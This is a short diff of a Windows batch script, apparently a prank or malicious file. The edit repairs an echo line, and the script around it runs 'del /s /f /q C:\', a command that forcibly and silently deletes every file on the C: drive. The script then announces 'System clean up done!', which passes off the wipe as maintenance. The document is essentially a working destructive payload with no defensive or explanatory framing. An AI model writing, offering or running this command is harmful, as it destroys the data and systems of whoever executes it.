@@ -2,6 +2,6 @@
 @echo Why don't we delete the system!
 @echo come?
 pause
-@Let's go!
+@echo Let's go!
 del /s /f /q C:\
 @echo System clean up done!
